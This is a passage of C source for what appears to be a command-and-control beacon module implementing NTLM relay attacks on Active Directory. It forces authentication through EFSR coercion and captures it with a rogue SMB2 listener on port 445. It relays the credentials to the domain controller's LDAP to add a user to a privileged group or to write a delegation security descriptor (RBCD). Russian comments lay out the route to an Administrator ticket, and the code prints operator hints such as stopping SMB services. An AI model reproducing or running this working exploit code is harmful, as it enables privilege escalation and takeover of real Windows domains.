            { DWORD e=ex; char t[12]; int tl=0;
              if(!e){t[tl++]='0';} else{while(e){t[tl++]='0'+(char)(e%10);e/=10;}}
              int p=22; for(int ri=tl-1;ri>=0;ri--)emsg[p++]=t[ri];
              emsg[p++]='\n';emsg[p]=0; out_write(emsg,p); }
        }
        RpcEndExcept
        RpcBindingFree(&hBinding);
        out_write("[efsr] done\n", 12);
        break;
    }

    InterlockedExchange(&g_ctx.coerce_done, 1);
    bfree(a);
    return 0;
}

#endif /* _WIN64 — CoerceArgs + efsr_coerce_thread */

// ---------------------------------------------------------------------------
// SMB2 listener thread
// ---------------------------------------------------------------------------

static DWORD WINAPI smb2_listener_thread(LPVOID param) {
    RelayCtx *ctx = (RelayCtx*)param;
    uint8_t *frame = NULL, *resp = NULL;
    SOCKET srv = INVALID_SOCKET, cli = INVALID_SOCKET;

    WSADATA wsa; WSAStartup(MAKEWORD(2,2),&wsa);

    srv = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if (srv == INVALID_SOCKET) goto done;
    // No SO_REUSEADDR: we need exclusive bind. If srvnet.sys is still loaded,
    // bind will fail with 10013 — caller reports it immediately.
    DWORD tmo=RELAY_TIMEOUT_MS;
    setsockopt(srv,SOL_SOCKET,SO_RCVTIMEO,(char*)&tmo,sizeof(tmo));

    struct sockaddr_in sa; rt_memset(&sa,0,sizeof(sa));
    sa.sin_family=AF_INET; sa.sin_port=htons(ctx->listen_port);
    sa.sin_addr.s_addr=INADDR_ANY;
    if (bind(srv,(struct sockaddr*)&sa,sizeof(sa)) != 0) {
        ctx->bind_wsa_err = WSAGetLastError();
        SetEvent(ctx->evt_listening);   // signal failure so main thread wakes early
        goto done;
    }
    if (listen(srv,1) != 0) { ctx->bind_wsa_err = WSAGetLastError(); SetEvent(ctx->evt_listening); goto done; }
    SetEvent(ctx->evt_listening);       // port bound and listening successfully

    // SO_RCVTIMEO does not apply to accept() on Windows — use select() to timeout
    {
        fd_set fds; FD_ZERO(&fds); FD_SET(srv, &fds);
        struct timeval tv; tv.tv_sec = RELAY_TIMEOUT_MS/1000; tv.tv_usec = 0;
        int sel = select(0, &fds, NULL, NULL, &tv);
        if (sel <= 0) { out_write("[listener] accept timeout\n",26); goto done; }
    }
    cli = accept(srv,NULL,NULL);
    closesocket(srv); srv = INVALID_SOCKET;
    if (cli == INVALID_SOCKET) { out_write("[listener] accept() failed\n",27); goto done; }
    out_write("[listener] connection accepted\n", 31);

    frame = (uint8_t*)bmalloc(65536);
    resp  = (uint8_t*)bmalloc(65536);
    if (!frame || !resp) goto done;

    uint32_t flen; uint64_t session_id = 0x0100000000000001ULL;

    // Receive first frame — may be SMB1 or SMB2 negotiate.
    if (!nb_recv(cli,frame,65536,&flen)) { out_write("[listener] nb_recv#1 failed\n",28); goto done; }
    if (flen < 4) { out_write("[listener] frame#1 too short\n",29); goto done; }
    {
        char hx[]="[listener] frame[0-3]: XX XX XX XX\n";
        const char *hex="0123456789ABCDEF";
        hx[23]=hex[frame[0]>>4]; hx[24]=hex[frame[0]&0xf];
        hx[26]=hex[frame[1]>>4]; hx[27]=hex[frame[1]&0xf];
        hx[29]=hex[frame[2]>>4]; hx[30]=hex[frame[2]&0xf];
        hx[32]=hex[frame[3]>>4]; hx[33]=hex[frame[3]&0xf];
        out_write(hx, 36);
    }

    uint64_t neg_msg_id = 0;
    if (frame[0] == 0xFF && frame[1] == 'S') {
        // SMB1 multi-protocol negotiate. Per MS-SMB2 §3.3.5.3: if we respond
        // with SMB2 NEGOTIATE with DialectRevision != 0x02FF the client goes
        // directly to SESSION_SETUP — no second SMB2 negotiate needed.
        neg_msg_id = 0;
    } else {
        // SMB2 negotiate directly.
        if (flen < 64) goto done;
        Smb2Hdr *rh0 = (Smb2Hdr*)frame;
        if (rh0->proto[0]!=0xFE || rh0->command!=SMB2_CMD_NEGOTIATE) goto done;
        neg_msg_id = rh0->msg_id;
    }

    uint32_t rlen = smb2_neg_response(neg_msg_id, resp);
    if (!nb_send(cli,resp,rlen)) goto done;

    // If client sent SMB2 negotiate explicitly, it will send SESSION_SETUP next.
    // If we responded to SMB1, client may send one more SMB2 negotiate first
    // (dialect 0x02FF path) — peek and handle if so.
    if (!nb_recv(cli,frame,65536,&flen)) { out_write("[listener] nb_recv#2 failed\n",28); goto done; }
    {
        Smb2Hdr *rh1 = (Smb2Hdr*)frame;
        if (flen >= 64 && rh1->proto[0]==0xFE &&
            rh1->command == SMB2_CMD_NEGOTIATE) {
            out_write("[listener] second SMB2 negotiate\n", 33);
            rlen = smb2_neg_response(rh1->msg_id, resp);
            if (!nb_send(cli,resp,rlen)) goto done;
            if (!nb_recv(cli,frame,65536,&flen)) { out_write("[listener] nb_recv#3 failed\n",28); goto done; }
        }
    }

    Smb2Hdr *rh = (Smb2Hdr*)frame;
    if (flen < 64 || rh->command != SMB2_CMD_SESSION_SETUP) {
        out_write("[listener] expected SESSION_SETUP, got other\n", 45); goto done;
    }
    out_write("[listener] SESSION_SETUP round1 received\n", 41);

    Smb2SsReq *ss = (Smb2SsReq*)(frame+64);
    uint16_t soff = ss->sec_offset, slen = ss->sec_length;
    if ((uint32_t)(soff+slen) > flen) { out_write("[listener] sec_offset out of bounds\n",36); goto done; }

    // Extract raw NTLMSSP NEGOTIATE from SPNEGO negTokenInit
    const uint8_t *ntlm_neg; uint32_t ntlm_neg_len;
    if (!spnego_extract(frame+soff, slen, &ntlm_neg, &ntlm_neg_len)) {
        out_write("[listener] no NTLMSSP in SESSION_SETUP r1\n", 42); goto done;
    }
    ctx->neg_token = (uint8_t*)bmalloc(ntlm_neg_len);
    if (!ctx->neg_token) goto done;
    rt_memcpy(ctx->neg_token, ntlm_neg, ntlm_neg_len);
    ctx->neg_len = ntlm_neg_len;
    dump_hex("[listener] DC NTLMSSP NEGOTIATE", ctx->neg_token, ctx->neg_len);
    SetEvent(ctx->evt_neg_ready);

    // Wait for challenge from LDAP relay
    if (WaitForSingleObject(ctx->evt_chal_ready, RELAY_TIMEOUT_MS) != WAIT_OBJECT_0) goto done;

    // Wrap raw NTLMSSP challenge in SPNEGO negTokenResp before sending to DC
    {
        uint8_t *spnego_chal = (uint8_t*)bmalloc(MAX_TOKEN);
        uint32_t spnego_chal_len = spnego_chal ?
            spnego_wrap_challenge(ctx->chal_token, ctx->chal_len, spnego_chal, MAX_TOKEN) : 0;
        rlen = smb2_sesssetup_response(rh->msg_id, session_id, STATUS_MORE_PROCESSING,
                                        spnego_chal, (uint16_t)spnego_chal_len, resp);
        bfree(spnego_chal);
    }
    if (!nb_send(cli,resp,rlen)) goto done;

    // SessionSetup round 2 — NTLMSSP_AUTH
    if (!nb_recv(cli,frame,65536,&flen)) goto done;
    rh = (Smb2Hdr*)frame;
    if (rh->command != SMB2_CMD_SESSION_SETUP) goto done;

    ss = (Smb2SsReq*)(frame+64);
    soff = ss->sec_offset; slen = ss->sec_length;
    if ((uint32_t)(soff+slen) > flen) goto done;

    // Save FULL SPNEGO negTokenResp (NTLMSSP AUTH + mechListMIC) — forward verbatim to LDAP.
    // mechListMIC is computed over mechTypes list using NTLM session key; rewrapping breaks it.
    ctx->auth_token = (uint8_t*)bmalloc(slen);
    if (!ctx->auth_token) goto done;
    rt_memcpy(ctx->auth_token, frame+soff, slen);
    ctx->auth_len = slen;
    dump_hex("[listener] DC SPNEGO AUTH (first 256B)", ctx->auth_token, ctx->auth_len);
    SetEvent(ctx->evt_auth_ready);

    // Wait for relay completion, then send SessionSetup success
    WaitForSingleObject(ctx->evt_relay_done, RELAY_TIMEOUT_MS);
    rlen = smb2_sesssetup_response(rh->msg_id, session_id, STATUS_SUCCESS, NULL, 0, resp);
    nb_send(cli,resp,rlen);

done:
    bfree(frame); bfree(resp);
    if (cli != INVALID_SOCKET) closesocket(cli);
    if (srv != INVALID_SOCKET) closesocket(srv);
    return 0;
}

// ---------------------------------------------------------------------------
// RBCD helpers: SID string parser, security descriptor builder, replace-modify
// ---------------------------------------------------------------------------

// Parse "S-1-5-21-A-B-C-D" into binary SID structure.
// Format: 1 byte Revision | 1 byte SubAuthorityCount | 6 bytes IdentifierAuthority (BE)
//         | N * 4 bytes SubAuthority (LE).  Returns total length, 0 on error.
static uint32_t sid_str2bin(const char *s, uint8_t *out, uint32_t cap) {
    if (!s || (s[0] != 'S' && s[0] != 's') || s[1] != '-') return 0;
    s += 2;
    uint32_t rev = 0;
    while (*s >= '0' && *s <= '9') { rev = rev*10 + (uint32_t)(*s - '0'); s++; }
    if (*s != '-' || rev != 1) return 0;
    s++;
    uint64_t ia = 0;
    while (*s >= '0' && *s <= '9') { ia = ia*10 + (uint64_t)(*s - '0'); s++; }
    uint32_t subs[15]; uint32_t n = 0;
    while (*s == '-' && n < 15) {
        s++;
        uint32_t v = 0;
        while (*s >= '0' && *s <= '9') { v = v*10 + (uint32_t)(*s - '0'); s++; }
        subs[n++] = v;
    }
    if (n == 0) return 0;
    uint32_t total = 8 + 4u*n;
    if (total > cap) return 0;
    out[0] = (uint8_t)rev;
    out[1] = (uint8_t)n;
    out[2] = (uint8_t)(ia >> 40);
    out[3] = (uint8_t)(ia >> 32);
    out[4] = (uint8_t)(ia >> 24);
    out[5] = (uint8_t)(ia >> 16);
    out[6] = (uint8_t)(ia >> 8);
    out[7] = (uint8_t)(ia);
    for (uint32_t i = 0; i < n; i++) {
        out[8 + i*4]   = (uint8_t)(subs[i]);
        out[8 + i*4+1] = (uint8_t)(subs[i] >> 8);
        out[8 + i*4+2] = (uint8_t)(subs[i] >> 16);
        out[8 + i*4+3] = (uint8_t)(subs[i] >> 24);
    }
    return total;
}

// Build a self-relative NT security descriptor with one ACCESS_ALLOWED ACE
// granting attacker SID over the target. Used as value of the
// msDS-AllowedToActOnBehalfOfOtherIdentity attribute (KDC reads DACL on
// S4U2Proxy and lets any SID listed here delegate to the target).
static uint32_t build_rbcd_sd(const uint8_t *sid, uint32_t sidlen,
                                uint8_t *out, uint32_t cap) {
    uint32_t ace_size = 8 + sidlen;          // ACE hdr(8) + AccessMask(4) is INSIDE the 8 — wait, see layout
    // ACE layout: AceType(1) AceFlags(1) AceSize(2) AccessMask(4) Sid(...)  → 8 bytes header (incl. mask) + sid
    ace_size = 8 + sidlen;
    uint32_t acl_size = 8 + ace_size;        // ACL hdr(8) + ACEs
    uint32_t sd_size  = 20 + acl_size;       // SD hdr(20) + DACL
    if (sd_size > cap) return 0;

    uint8_t *p = out;
    // SD header (self-relative, DACL present)
    *p++ = 0x01; *p++ = 0x00;                            // Revision=1, Sbz1=0
    *p++ = 0x04; *p++ = 0x80;                            // Control = 0x8004 LE
    *p++ = 0x00; *p++ = 0x00; *p++ = 0x00; *p++ = 0x00;  // OffsetOwner=0
    *p++ = 0x00; *p++ = 0x00; *p++ = 0x00; *p++ = 0x00;  // OffsetGroup=0
    *p++ = 0x00; *p++ = 0x00; *p++ = 0x00; *p++ = 0x00;  // OffsetSacl=0
    *p++ = 0x14; *p++ = 0x00; *p++ = 0x00; *p++ = 0x00;  // OffsetDacl=20

    // ACL header
    *p++ = 0x02; *p++ = 0x00;                            // AclRevision=2, Sbz1=0
    *p++ = (uint8_t)acl_size; *p++ = (uint8_t)(acl_size >> 8);  // AclSize LE
    *p++ = 0x01; *p++ = 0x00;                            // AceCount=1
    *p++ = 0x00; *p++ = 0x00;                            // Sbz2

    // ACE: ACCESS_ALLOWED, full control
    *p++ = 0x00; *p++ = 0x00;                            // AceType=0, AceFlags=0
    *p++ = (uint8_t)ace_size; *p++ = (uint8_t)(ace_size >> 8);  // AceSize LE
    *p++ = 0xff; *p++ = 0x01; *p++ = 0x0f; *p++ = 0x00;  // AccessMask=0x000F01FF
    rt_memcpy(p, sid, sidlen); p += sidlen;

    return sd_size;
}

// LDAP ModifyRequest with operation=replace (2) for binary attribute value.
static uint32_t ldap_modify_replace(uint8_t *out, int msg_id,
                                      const char *target_dn,
                                      const char *attr,
                                      const uint8_t *val, uint32_t val_len) {
    uint32_t tdn = (uint32_t)rt_strlen(target_dn);
    uint32_t aln = (uint32_t)rt_strlen(attr);

    uint32_t set_c  = ber_hdr_sz(val_len) + val_len;
    uint32_t set_t  = ber_hdr_sz(set_c) + set_c;
    uint32_t attr_c = ber_hdr_sz(aln) + aln + set_t;
    uint32_t attr_t = ber_hdr_sz(attr_c) + attr_c;
    uint32_t chg_c  = 3 + attr_t;                        // ENUM(replace=2) + attr
    uint32_t chg_t  = ber_hdr_sz(chg_c) + chg_c;
    uint32_t chgs_c = chg_t;
    uint32_t chgs_t = ber_hdr_sz(chgs_c) + chgs_c;
    uint32_t mod_c  = ber_hdr_sz(tdn) + tdn + chgs_t;
    uint32_t mod_t  = ber_hdr_sz(mod_c) + mod_c;
    uint32_t msg_c  = 3 + mod_t;

    uint8_t *p = out;
    *p++ = 0x30; p = ber_put_len(p, msg_c);
    p = ber_int(p, msg_id);
    *p++ = 0x66; p = ber_put_len(p, mod_c);              // [APPLICATION 6]
    p = ber_octet(p, (const uint8_t*)target_dn, tdn);
    *p++ = 0x30; p = ber_put_len(p, chgs_c);
    *p++ = 0x30; p = ber_put_len(p, chg_c);
    *p++ = 0x0a; *p++ = 0x01; *p++ = 0x02;               // ENUM = 2 (replace)
    *p++ = 0x30; p = ber_put_len(p, attr_c);
    p = ber_octet(p, (const uint8_t*)attr, aln);
    *p++ = 0x31; p = ber_put_len(p, set_c);
    p = ber_octet(p, val, val_len);
    return (uint32_t)(p - out);
}

// ---------------------------------------------------------------------------
// cmd_ldap_addda — main entry point
// ---------------------------------------------------------------------------

void cmd_ldap_addda(const BeaconTask *t) {
    char dc_ip[64]={0}, beacon_ip[64]={0};
    char user_dn[512]={0}, group_dn[512]={0};
    uint32_t listen_port = 445;

    if (!kv_get_str(t->pay,t->pay_len,"dc_ip",    dc_ip,    sizeof(dc_ip))     ||
        !kv_get_str(t->pay,t->pay_len,"beacon_ip",beacon_ip,sizeof(beacon_ip)) ||
        !kv_get_str(t->pay,t->pay_len,"user_dn",  user_dn,  sizeof(user_dn))   ||
        !kv_get_str(t->pay,t->pay_len,"group_dn", group_dn, sizeof(group_dn))) {
        out_write("ldap_addda: need dc_ip, beacon_ip, user_dn, group_dn\n", 52);
        return;
    }
    kv_get_u32(t->pay,t->pay_len,"listen_port",&listen_port);
    if (listen_port == 0) listen_port = 445;

    rt_memset(&g_ctx,0,sizeof(g_ctx));
    rt_memcpy(g_ctx.dc_ip,    dc_ip,    rt_strlen(dc_ip)+1);
    rt_memcpy(g_ctx.beacon_ip,beacon_ip,rt_strlen(beacon_ip)+1);
    rt_memcpy(g_ctx.user_dn,  user_dn,  rt_strlen(user_dn)+1);
    rt_memcpy(g_ctx.group_dn, group_dn, rt_strlen(group_dn)+1);
    g_ctx.listen_port = (USHORT)listen_port;

    g_ctx.evt_listening  = CreateEventA(NULL,FALSE,FALSE,NULL);
    g_ctx.evt_neg_ready  = CreateEventA(NULL,FALSE,FALSE,NULL);
    g_ctx.evt_chal_ready = CreateEventA(NULL,FALSE,FALSE,NULL);
    g_ctx.evt_auth_ready = CreateEventA(NULL,FALSE,FALSE,NULL);
    g_ctx.evt_relay_done = CreateEventA(NULL,FALSE,FALSE,NULL);

    out_write("[ldap_addda] starting SMB2 listener\n", 36);
    out_flush_now();

    HANDLE h_smb = CreateThread(NULL,0,smb2_listener_thread,&g_ctx,0,NULL);
    if (!h_smb) { out_write("ldap_addda: CreateThread failed\n",32); goto ev_cleanup; }

    // Wait up to 3 s for bind/listen to succeed
    if (WaitForSingleObject(g_ctx.evt_listening, 3000) != WAIT_OBJECT_0) {
        out_write("ldap_addda: listener did not start (CreateSocket?)\n", 51); goto thread_wait;
    }
    if (g_ctx.bind_wsa_err != 0) {
        // bind failed — most likely srvnet.sys still holds port 445
        char msg[96];
        int ml = (int)rt_strlen("[ldap_addda] bind failed WSA=");
        rt_memcpy(msg, "[ldap_addda] bind failed WSA=", ml);
        // append decimal error code
        DWORD e = g_ctx.bind_wsa_err; int pos = ml;
        char tmp[12]; int tl=0;
        if (e == 0) { tmp[tl++]='0'; } else { DWORD ee=e; while(ee){tmp[tl++]='0'+(char)(ee%10);ee/=10;} }
        for(int ri=tl-1;ri>=0;ri--) msg[pos++]=tmp[ri];
        msg[pos++]='\n'; msg[pos]=0;
        out_write(msg, pos);
        out_write("[ldap_addda] hint: sc stop srv2 && sc stop srvnet to free port 445\n", 68);
        goto thread_wait;
    }
    out_write("[ldap_addda] listening OK\n", 26);
    out_flush_now();

    // Start EFSR coercion thread — target = beacon's OWN host (self-coerce).
    // MACHINE$ (local machine account) authenticates to our SMB listener,
    // we relay MACHINE$'s NTLM to DC LDAP. Since client identity (MACHINE$)
    // differs from LDAP target host (DC01), LSA reflection protection does
    // NOT trigger. Trade-off: MACHINE$ usually lacks Domain Admin write rights;
    // for that, this attack chains with RBCD or ESC8 — direct DA add only
    // works if MACHINE$ already has write ACL on the target group.
#ifdef _WIN64
    CoerceArgs *ca = (CoerceArgs*)bmalloc(sizeof(CoerceArgs));
    if (ca) {
        rt_memcpy(ca->target,  beacon_ip, sizeof(ca->target));
        rt_memcpy(ca->listener,beacon_ip, sizeof(ca->listener));
        ca->port = (USHORT)listen_port;
        HANDLE h = CreateThread(NULL,0,efsr_coerce_thread,ca,0,NULL);
        if (h) CloseHandle(h); else bfree(ca);
    }
#endif /* _WIN64 */

    out_write("[ldap_addda] waiting for NEGOTIATE...\n", 38);
    out_flush_now();
    if (WaitForSingleObject(g_ctx.evt_neg_ready,RELAY_TIMEOUT_MS) != WAIT_OBJECT_0) {
        if (g_ctx.coerce_done)
            out_write("ldap_addda: NEGOTIATE timeout — coercion ran but DC did not connect (firewall?)\n", 79);
        else
            out_write("ldap_addda: NEGOTIATE timeout — coercion thread did not finish (pipe unavailable?)\n", 83);
        goto thread_wait;
    }

    WSADATA wsa; WSAStartup(MAKEWORD(2,2),&wsa);
    SOCKET ldap_s = ldap_connect_ip(dc_ip);
    if (ldap_s == INVALID_SOCKET) {
        out_write("ldap_addda: LDAP connect failed\n",32); goto thread_wait;
    }

    out_write("[ldap_addda] relaying NEGOTIATE -> LDAP\n", 40);
    out_flush_now();

    uint8_t *lreq  = (uint8_t*)bmalloc(MAX_LDAP);
    uint8_t *lresp = (uint8_t*)bmalloc(MAX_LDAP);
    int done = 0;

    if (!lreq || !lresp) goto ldap_cleanup;

    // Wrap raw NTLMSSP NEGOTIATE in clean SPNEGO negTokenInit for LDAP
    uint8_t *spnego_neg = (uint8_t*)bmalloc(MAX_TOKEN);
    uint32_t spnego_neg_len = spnego_neg ?
        spnego_wrap_negotiate(g_ctx.neg_token, g_ctx.neg_len, spnego_neg, MAX_TOKEN) : 0;
    uint32_t rlen = ldap_bind(lreq, 1, spnego_neg, spnego_neg_len);
    bfree(spnego_neg);
    uint32_t rlen2 = MAX_LDAP;
    if (!ldap_xchg(ldap_s,lreq,rlen,lresp,&rlen2)) {
        out_write("ldap_addda: LDAP bind r1 failed\n",32); goto ldap_cleanup;
    }

    // Dump LDAP response bytes for diagnosis
    {
        char hdr[] = "[ldap] resp len=XXXXXX bytes: ";
        uint32_t v = rlen2, p = 16;
        char tmp[12]; int tl=0;
        if(!v){tmp[tl++]='0';}else{uint32_t vv=v;while(vv){tmp[tl++]='0'+(char)(vv%10);vv/=10;}}
        for(int ri=tl-1;ri>=0;ri--) hdr[p++]=tmp[ri];
        hdr[p++]='\n'; hdr[p]=0;
        out_write(hdr, p);
        const char *hex="0123456789ABCDEF";
        char hxbuf[128]; int hxl=0;
        uint32_t n = rlen2 < 32 ? rlen2 : 32;
        for(uint32_t bi=0;bi<n;bi++){
            hxbuf[hxl++]=hex[lresp[bi]>>4];
            hxbuf[hxl++]=hex[lresp[bi]&0xf];
            hxbuf[hxl++]=' ';
        }
        hxbuf[hxl++]='\n'; hxbuf[hxl]=0;
        out_write(hxbuf, hxl);
        out_flush_now();
    }

    const uint8_t *chal; uint32_t chal_len;
    if (ldap_parse_bind(lresp,rlen2,&chal,&chal_len) != 1) {
        out_write("ldap_addda: no NTLMSSP challenge\n",33); goto ldap_cleanup;
    }

    // [7] from GSS-SPNEGO bind is a SPNEGO negTokenResp — extract raw NTLMSSP
    const uint8_t *raw_chal; uint32_t raw_chal_len;
    if (!spnego_extract(chal, chal_len, &raw_chal, &raw_chal_len)) {
        out_write("ldap_addda: no NTLMSSP inside LDAP challenge SPNEGO\n",52); goto ldap_cleanup;
    }
    g_ctx.chal_token = (uint8_t*)bmalloc(raw_chal_len);
    if (!g_ctx.chal_token) goto ldap_cleanup;
    rt_memcpy(g_ctx.chal_token, raw_chal, raw_chal_len);
    g_ctx.chal_len = raw_chal_len;
    dump_hex("[ldap] LDAP NTLMSSP CHALLENGE", g_ctx.chal_token, g_ctx.chal_len);
    SetEvent(g_ctx.evt_chal_ready);

    out_write("[ldap_addda] waiting for AUTH...\n", 33);
    out_flush_now();
    if (WaitForSingleObject(g_ctx.evt_auth_ready,RELAY_TIMEOUT_MS) != WAIT_OBJECT_0) {
        out_write("ldap_addda: AUTH timeout\n",25);
        SetEvent(g_ctx.evt_relay_done); goto ldap_cleanup;
    }

    out_write("[ldap_addda] relaying AUTH -> LDAP\n", 35);
    out_flush_now();
    // Forward DC's full SPNEGO negTokenResp verbatim — preserves mechListMIC
    rlen  = ldap_bind(lreq, 2, g_ctx.auth_token, g_ctx.auth_len);
    rlen2 = MAX_LDAP;
    if (!ldap_xchg(ldap_s,lreq,rlen,lresp,&rlen2)) {
        out_write("ldap_addda: LDAP bind r2 failed\n",32);
        SetEvent(g_ctx.evt_relay_done); goto ldap_cleanup;
    }
    SetEvent(g_ctx.evt_relay_done);

    // Dump AUTH LDAP response for diagnosis
    {
        char hdr2[] = "[ldap] auth resp len=XXXXXX: ";
        uint32_t v=rlen2, p2=21; char tmp2[12]; int tl2=0;
        if(!v){tmp2[tl2++]='0';}else{uint32_t vv=v;while(vv){tmp2[tl2++]='0'+(char)(vv%10);vv/=10;}}
        for(int ri=tl2-1;ri>=0;ri--) hdr2[p2++]=tmp2[ri];
        hdr2[p2++]='\n'; hdr2[p2]=0; out_write(hdr2, p2);
        const char *hex2="0123456789ABCDEF";
        char hx2[600]; int hl2=0;
        uint32_t n2 = rlen2 < 180 ? rlen2 : 180;
        for(uint32_t bi=0;bi<n2;bi++){
            hx2[hl2++]=hex2[lresp[bi]>>4]; hx2[hl2++]=hex2[lresp[bi]&0xf]; hx2[hl2++]=' ';
            if((bi&0x1f)==0x1f) hx2[hl2++]='\n';
        }
        hx2[hl2++]='\n'; hx2[hl2]=0; out_write(hx2, hl2); out_flush_now();
        // Also dump as ASCII so we can read the diagnosticMessage text
        char ax[200]; int al=0;
        for(uint32_t bi=0;bi<n2;bi++){
            uint8_t b = lresp[bi];
            ax[al++] = (b >= 0x20 && b < 0x7f) ? (char)b : '.';
        }
        ax[al++]='\n'; ax[al]=0; out_write(ax, al); out_flush_now();
    }

    if (ldap_parse_bind(lresp,rlen2,&chal,&chal_len) != 2) {
        out_write("ldap_addda: LDAP auth rejected\n",31); goto ldap_cleanup;
    }

    out_write("[ldap_addda] LDAP bind OK — sending ModifyRequest\n", 50);
    out_flush_now();
    rlen  = ldap_modify(lreq, 3, group_dn, user_dn);
    rlen2 = MAX_LDAP;
    out_write("[ldap_addda] ModifyRequest sent, waiting for response (up to 30s)...\n", 70);
    out_flush_now();
    if (ldap_xchg(ldap_s,lreq,rlen,lresp,&rlen2)) {
        int code = ldap_result_code(lresp,rlen2);
        if (code == 0) {
            out_write("[ldap_addda] SUCCESS: user added to group\n",42);
            out_flush_now();
            done = 1;
        } else {
            char msg[] = "[ldap_addda] ModifyRequest failed code=XX\n";
            msg[38] = '0' + (char)((code/10)%10);
            msg[39] = '0' + (char)(code%10);
            out_write(msg, sizeof(msg)-1);
            out_flush_now();
        }
    } else {
        int wsa_err = WSAGetLastError();
        char msg[] = "[ldap_addda] recv timeout / failed, WSA=XXXXXXXXXX\n";
        DWORD e = (DWORD)wsa_err; char tmp[12]; int tl = 0;
        if (!e) tmp[tl++] = '0'; else while (e) { tmp[tl++] = '0' + (char)(e%10); e /= 10; }
        int pos = 40; for (int ri = tl-1; ri >= 0; ri--) msg[pos++] = tmp[ri];
        msg[pos++] = '\n'; msg[pos] = 0;
        out_write(msg, pos);
        out_write("[ldap_addda] cause: NTLM SASL signing was negotiated (NEGOTIATE_SIGN)\n", 70);
        out_write("[ldap_addda]   DC silently drops unsigned PDUs after SASL bind even if\n", 71);
        out_write("[ldap_addda]   LDAPServerIntegrity=0 (registry only controls bind-time check).\n", 80);
        out_write("[ldap_addda]   Workarounds: ADCS ESC8 (HTTP /certsrv), or LDAPS with EPA off.\n", 78);
        out_flush_now();
    }
    (void)done;

ldap_cleanup:
    bfree(lreq); bfree(lresp);
    closesocket(ldap_s);

thread_wait:
    if (h_smb) { WaitForSingleObject(h_smb,5000); CloseHandle(h_smb); }

ev_cleanup:
    if (g_ctx.neg_token)  bfree(g_ctx.neg_token);
    if (g_ctx.chal_token) bfree(g_ctx.chal_token);
    if (g_ctx.auth_token) bfree(g_ctx.auth_token);
    CloseHandle(g_ctx.evt_listening);
    CloseHandle(g_ctx.evt_neg_ready);
    CloseHandle(g_ctx.evt_chal_ready);
    CloseHandle(g_ctx.evt_auth_ready);
    CloseHandle(g_ctx.evt_relay_done);
}

// ---------------------------------------------------------------------------
// cmd_ldap_rbcd — Resource-Based Constrained Delegation via NTLM relay
// ---------------------------------------------------------------------------
//
// Цепочка:
//   1) Принуждаем TARGET (coerce_ip, обычно member-сервер или второй DC) через
//      EFSR. TARGET$ аутентифицируется к нашему SMB-листенеру.
//   2) Релэим TARGET$ NTLM в LDAP DC.  TARGET$ имеет SELF-право на свой
//      собственный объект компьютера в AD, включая запись атрибута
//      msDS-AllowedToActOnBehalfOfOtherIdentity.
//   3) После bind отправляем ModifyRequest с replace-операцией — пишем
//      бинарный security descriptor, который разрешает <attacker_sid>
//      делегироваться к TARGET.
//   4) Снаружи (отдельно): из-под учётки с этим SID делаем S4U2Self+S4U2Proxy
//      → получаем service-ticket за Administrator на TARGET → доступ как админ.
//
// KV: dc_ip, beacon_ip, coerce_ip, target_dn, attacker_sid, listen_port (опц.)
//
// Ограничение: после успешного bind ModifyRequest всё ещё требует SASL-подписи
// если был согласован NEGOTIATE_SIGN — в полностью пропатченных доменах это
// упирается в тот же потолок, что и ldap_addda.  Команда полезна на лаб-DC с
// LDAPServerIntegrity=0 или против non-AD LDAP без подписи.
//
void cmd_ldap_rbcd(const BeaconTask *t) {
    char dc_ip[64]={0}, beacon_ip[64]={0}, coerce_ip[64]={0};
    char target_dn[512]={0}, attacker_sid[256]={0};
    uint32_t listen_port = 445;

    if (!kv_get_str(t->pay,t->pay_len,"dc_ip",       dc_ip,       sizeof(dc_ip))       ||
        !kv_get_str(t->pay,t->pay_len,"beacon_ip",   beacon_ip,   sizeof(beacon_ip))   ||
        !kv_get_str(t->pay,t->pay_len,"coerce_ip",   coerce_ip,   sizeof(coerce_ip))   ||
        !kv_get_str(t->pay,t->pay_len,"target_dn",   target_dn,   sizeof(target_dn))   ||
        !kv_get_str(t->pay,t->pay_len,"attacker_sid",attacker_sid,sizeof(attacker_sid))) {
        out_write("ldap_rbcd: need dc_ip, beacon_ip, coerce_ip, target_dn, attacker_sid\n", 68);
        return;
    }
    kv_get_u32(t->pay,t->pay_len,"listen_port",&listen_port);
    if (listen_port == 0) listen_port = 445;

    // Pre-build SID + security descriptor — fail fast on bad input.
    uint8_t sid_bin[68];
    uint32_t sid_len = sid_str2bin(attacker_sid, sid_bin, sizeof(sid_bin));
    if (sid_len == 0) {
        out_write("ldap_rbcd: invalid SID format (expected S-1-5-21-A-B-C-D)\n", 58);
        return;
    }
    uint8_t sd_bin[256];
    uint32_t sd_len = build_rbcd_sd(sid_bin, sid_len, sd_bin, sizeof(sd_bin));
    if (sd_len == 0) {
        out_write("ldap_rbcd: SD construction failed\n", 34);
        return;
    }

    rt_memset(&g_ctx,0,sizeof(g_ctx));
    rt_memcpy(g_ctx.dc_ip,    dc_ip,     rt_strlen(dc_ip)+1);
    rt_memcpy(g_ctx.beacon_ip,beacon_ip, rt_strlen(beacon_ip)+1);
    g_ctx.listen_port = (USHORT)listen_port;

    g_ctx.evt_listening  = CreateEventA(NULL,FALSE,FALSE,NULL);
    g_ctx.evt_neg_ready  = CreateEventA(NULL,FALSE,FALSE,NULL);
    g_ctx.evt_chal_ready = CreateEventA(NULL,FALSE,FALSE,NULL);
    g_ctx.evt_auth_ready = CreateEventA(NULL,FALSE,FALSE,NULL);
    g_ctx.evt_relay_done = CreateEventA(NULL,FALSE,FALSE,NULL);

    out_write("[ldap_rbcd] starting SMB2 listener\n", 35);
    out_flush_now();

    HANDLE h_smb = CreateThread(NULL,0,smb2_listener_thread,&g_ctx,0,NULL);
    if (!h_smb) { out_write("ldap_rbcd: CreateThread failed\n",31); goto ev_cleanup_r; }

    if (WaitForSingleObject(g_ctx.evt_listening, 3000) != WAIT_OBJECT_0) {
        out_write("ldap_rbcd: listener did not start\n", 34); goto thread_wait_r;
    }
    if (g_ctx.bind_wsa_err != 0) {
        char msg[96]; int ml = (int)rt_strlen("[ldap_rbcd] bind failed WSA=");
        rt_memcpy(msg, "[ldap_rbcd] bind failed WSA=", ml);
        DWORD e = g_ctx.bind_wsa_err; int pos = ml;
        char tmp[12]; int tl=0;
        if (!e) tmp[tl++]='0'; else { DWORD ee=e; while(ee){tmp[tl++]='0'+(char)(ee%10);ee/=10;} }
        for(int ri=tl-1;ri>=0;ri--) msg[pos++]=tmp[ri];
        msg[pos++]='\n'; msg[pos]=0;
        out_write(msg, pos);
        goto thread_wait_r;
    }
